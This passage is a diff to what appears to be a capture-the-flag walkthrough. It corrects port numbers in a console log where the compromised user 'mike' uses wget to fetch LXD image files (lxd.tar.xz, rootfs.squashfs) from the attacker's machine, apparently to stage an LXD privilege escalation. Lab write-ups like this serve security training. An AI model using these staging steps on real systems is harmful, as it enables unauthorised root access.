@@ -312,10 +312,10 @@ python3 -m http.server 8000
 Back on the target machine:
 
 ```console 
-mike@included:~$ wget http://10.10.14.15:8001/lxd.tar.xz
+mike@included:~$ wget http://10.10.14.15:8000/lxd.tar.xz
 wget http://10.10.14.15:8001/lxd.tar.xz
---2022-04-18 20:48:57--  http://10.10.14.15:8001/lxd.tar.xz
-Connecting to 10.10.14.15:8001... connected.
+--2022-04-18 20:48:57--  http://10.10.14.15:8000/lxd.tar.xz
+Connecting to 10.10.14.15:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 864 [application/x-xz]
 Saving to: ‘lxd.tar.xz’
@@ -324,10 +324,10 @@ lxd.tar.xz          100%[===================>]     864  --.-KB/s    in 0s
 
 2022-04-18 20:48:57 (17.7 MB/s) - ‘lxd.tar.xz’ saved [864/864]
 
-mike@included:~$ wget http://10.10.14.15:8001/rootfs.squashfs
+mike@included:~$ wget http://10.10.14.15:8000/rootfs.squashfs
 wget http://10.10.14.15:8001/rootfs.squashfs
---2022-04-18 20:49:12--  http://10.10.14.15:8001/rootfs.squashfs
-Connecting to 10.10.14.15:8001... connected.
+--2022-04-18 20:49:12--  http://10.10.14.15:8000/rootfs.squashfs
+Connecting to 10.10.14.15:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 2052096 (2.0M) [application/octet-stream]
 Saving to: ‘rootfs.squashfs’
